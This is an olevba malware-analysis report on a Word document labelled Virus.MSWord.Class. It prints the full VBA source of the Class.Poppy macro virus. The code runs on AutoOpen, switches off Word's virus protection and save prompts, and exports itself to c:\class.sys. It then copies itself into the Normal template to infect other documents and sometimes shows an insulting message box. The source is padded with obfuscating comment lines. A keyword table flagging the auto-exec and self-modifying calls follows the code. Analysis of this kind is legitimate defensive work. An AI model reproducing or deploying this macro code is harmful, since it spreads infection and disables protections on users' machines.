olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.fm-3126d1aebbd474a8b3e9962c934dcf226ade114e
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.fm-3126d1aebbd474a8b3e9962c934dcf226ade114e - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
'HH20.01.99 19:11:36\\AS400\PRT05 on NE00:briefingespum.docKarl Klammer
On Error GoTo out
'HH20.01.99 19:11:36\\AS400\PRT05 on NE00:briefingespum.docKarl Klammer
Options.VirusProtection = False
'HH20.01.99 19:11:36\\AS400\PRT05 on NE00:briefingespum.docKarl Klammer
Options.SaveNormalPrompt = False
'HH20.01.99 19:11:36\\AS400\PRT05 on NE00:briefingespum.docKarl Klammer
Options.ConfirmConversions = False
'HH20.01.99 19:11:36\\AS400\PRT05 on NE00:briefingespum.docKarl Klammer
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'HH20.01.99 19:11:36\\AS400\PRT05 on NE00:briefingespum.docKarl Klammer
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'HH20.01.99 19:11:36\\AS400\PRT05 on NE00:briefingespum.docKarl Klammer
If nt > 70 And ad > 0 Then GoTo out
'HH20.01.99 19:11:36\\AS400\PRT05 on NE00:briefingespum.docKarl Klammer
If nt < 70 Then
'HH20.01.99 19:11:36\\AS400\PRT05 on NE00:briefingespum.docKarl Klammer
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'HH20.01.99 19:11:36\\AS400\PRT05 on NE00:briefingespum.docKarl Klammer
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'HH20.01.99 19:11:36\\AS400\PRT05 on NE00:briefingespum.docKarl Klammer
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'HH20.01.99 19:11:36\\AS400\PRT05 on NE00:briefingespum.docKarl Klammer
End If
'HH20.01.99 19:11:36\\AS400\PRT05 on NE00:briefingespum.docKarl Klammer
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'HH20.01.99 19:11:36\\AS400\PRT05 on NE00:briefingespum.docKarl Klammer
If Day(Now) = 14 And (Month(Now) > 5) Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "VicodinES Loves You / Class.Poppy"
'HH20.01.99 19:11:36\\AS400\PRT05 on NE00:briefingespum.docKarl Klammer
host.codemodule.AddFromFile ("c:\class.sys")
'HH20.01.99 19:11:36\\AS400\PRT05 on NE00:briefingespum.docKarl Klammer
With host.codemodule
'HH20.01.99 19:11:36\\AS400\PRT05 on NE00:briefingespum.docKarl Klammer
    For x = 1 To 4
'HH20.01.99 19:11:36\\AS400\PRT05 on NE00:briefingespum.docKarl Klammer
    .deletelines 1
'HH20.01.99 19:11:36\\AS400\PRT05 on NE00:briefingespum.docKarl Klammer
    Next x
'HH20.01.99 19:11:36\\AS400\PRT05 on NE00:briefingespum.docKarl Klammer
End With
'HH20.01.99 19:11:36\\AS400\PRT05 on NE00:briefingespum.docKarl Klammer
If nt < 70 Then
'HH20.01.99 19:11:36\\AS400\PRT05 on NE00:briefingespum.docKarl Klammer
    With host.codemodule
'HH20.01.99 19:11:36\\AS400\PRT05 on NE00:briefingespum.docKarl Klammer
    .replaceline 1, "Sub AutoClose()"
'HH20.01.99 19:11:36\\AS400\PRT05 on NE00:briefingespum.docKarl Klammer
    .replaceline 71, "Sub ToolsMacro()"
'HH20.01.99 19:11:36\\AS400\PRT05 on NE00:briefingespum.docKarl Klammer
    End With
'HH20.01.99 19:11:36\\AS400\PRT05 on NE00:briefingespum.docKarl Klammer
End If
'HH20.01.99 19:11:36\\AS400\PRT05 on NE00:briefingespum.docKarl Klammer
With host.codemodule
'HH20.01.99 19:11:36\\AS400\PRT05 on NE00:briefingespum.docKarl Klammer
    For x = 2 To 72 Step 2
'HH20.01.99 19:11:36\\AS400\PRT05 on NE00:briefingespum.docKarl Klammer
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow & Application.Assistant
'HH20.01.99 19:11:36\\AS400\PRT05 on NE00:briefingespum.docKarl Klammer
    Next x
'HH20.01.99 19:11:36\\AS400\PRT05 on NE00:briefingespum.docKarl Klammer
End With
'HH20.01.99 19:11:36\\AS400\PRT05 on NE00:briefingespum.docKarl Klammer
out:
'HH20.01.99 19:11:36\\AS400\PRT05 on NE00:briefingespum.docKarl Klammer
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'HH20.01.99 19:11:36\\AS400\PRT05 on NE00:briefingespum.docKarl Klammer
End Sub
'HH20.01.99 19:11:36\\AS400\PRT05 on NE00:briefingespum.docKarl Klammer
Sub ViewVBCode()
'HH20.01.99 19:11:36\\AS400\PRT05 on NE00:briefingespum.docKarl Klammer
End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

